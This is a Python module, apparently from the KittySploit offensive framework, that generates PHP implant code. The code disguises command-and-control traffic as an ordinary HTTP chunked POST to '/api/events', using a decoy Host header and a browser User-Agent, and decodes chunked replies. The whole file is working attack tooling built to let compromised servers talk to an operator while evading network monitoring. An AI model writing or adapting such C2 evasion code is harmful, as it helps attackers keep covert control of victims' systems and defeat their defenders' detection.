#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Optional

from kittysploit import *
from modules.transforms.python.protocol.http_chunked import Module as PythonHttpChunkedTransform


class Module(Transform, PythonHttpChunkedTransform):
    """PHP HTTP chunked transfer mimic transform."""

    SUPPORTED_CLIENT_LANGUAGES = ["php"]

    __info__ = {
        "name": "PHP HTTP Chunked Mimic Transform",
        "description": "Wraps C2 bytes in HTTP/1.1 chunked transfer frames and emits PHP client code.",
        "author": "KittySploit Team",
        "version": "1.0.0",
    }

    def generate_client_code(self, language: str) -> Optional[str]:
        if language != "php":
            return None
        return (
            "$xf_buf='';$xf_first=true;"
            "function _xf_encode($d){global $xf_first;if($d===''){return $d;}$out='';"
            "if($xf_first){$out=\"POST /api/events HTTP/1.1\\r\\nHost: update.local\\r\\nUser-Agent: Mozilla/5.0\\r\\nContent-Type: application/octet-stream\\r\\nTransfer-Encoding: chunked\\r\\nConnection: keep-alive\\r\\n\\r\\n\";$xf_first=false;}"
            "$i=0;$l=strlen($d);while($i<$l){$c=substr($d,$i,16384);$i+=strlen($c);$out.=dechex(strlen($c)).\"\\r\\n\".$c.\"\\r\\n\";}return $out;}"
            "function _xf_decode($d){global $xf_buf;$xf_buf.=$d;$out='';"
            "while($xf_buf!==''){if(strncmp($xf_buf,'HTTP/',5)===0||strncmp($xf_buf,'POST ',5)===0||strncmp($xf_buf,'GET ',4)===0){$e=strpos($xf_buf,\"\\r\\n\\r\\n\");if($e===false){break;}$xf_buf=substr($xf_buf,$e+4);continue;}"
            "$p=strpos($xf_buf,\"\\r\\n\");if($p===false){break;}$line=trim(explode(';',substr($xf_buf,0,$p),2)[0]);$ln=hexdec($line);"
            "if($line===''||$ln>16384){$xf_buf=substr($xf_buf,1);continue;}$frame=$p+2+$ln+2;if(strlen($xf_buf)<$frame){break;}"
            "$out.=substr($xf_buf,$p+2,$ln);$xf_buf=substr($xf_buf,$frame);}return $out;}"
        )
